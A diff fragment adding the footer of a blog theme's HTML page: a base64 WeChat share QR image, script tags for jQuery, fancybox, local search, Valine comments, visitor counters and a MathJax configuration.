+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvElEQVR42u3aQW7DMAwEwPz/0ynQU4HC9pIU2xzGpyB1HI0CSOxSr1d8vb+v6v2/P3X/zvvi6o3hhYeHh7fGe99eV4NIXl8hk3uunpaPGQ8PD2+bd78Z3A8iuTOfmlP34+Hh4X0CLy+ak60lKZqr5TUeHh7ep/GScKE6QdUSHA8PD+9zeEkYEf3zH0e6vUhiMWvBw8PD64+nsMT/1+vF/h4eHh7eoKt+qhmWHB1IlvXyaPHw8PAWeElMMHk/DzLygv7+nVc+o3h4eHgtXq/FNWmV9QZa+K1+/hUPDw9vgddb3PMyOqdWD3gVSmo8PDy8o7xe9DBaoFsHBXppLR4eHt4G79RX5ux5MV2dSjw8PLxtXnXoediax7g9wMMT8PDw8BZ4ecvq1GKdTFM19sXDw8Pb5lVD1bw1lccQeSFejjbw8PDw/oTX2zCqBXoev1b3tIeUGg8PD+8QL2/2nxpofihhtG3g4eHhrfHyAnfS7K8GwQciDzw8PLwFXhJJ5OBJhFHdivLpw8PDw9vmVYOA/P1evJtP8eV48PDw8I7y3sWr+qmkSVY9jFXYivDw8PDWeJO4oTfQpNSeTPRod8LDw8Mr5qL3i/IknM2fn3xjEu/i4eHh7fHyhfU+GjgV155q1OHh4eFt8JLSOV++k69PpiBf9B9+GDw8PLxl3nxjmAcc1dcPz8HDw8Nb4E0OSM0j2l7ckDfD8PDw8DZ4kyU731TykrqZPScnI/Dw8PAWeHnDflJq59FD9bhVIf3Fw8PDG/B6Rwqqw8qbZ3kEXD2OgIeHh3eWlx8M7ZXF+TMnW0tz98PDw8Mb8KoHCCaldvK06g52+HwEHh4e3iFe8qlJSJEX8cmU4eHh4X0Obx7p5oV4Eo48hM54eHh4a7wkjJg0zKqNqwkbDw8Pb5s3aYDlRfN8KPMSHw8PD2/M+wJNYMU6CK22LAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
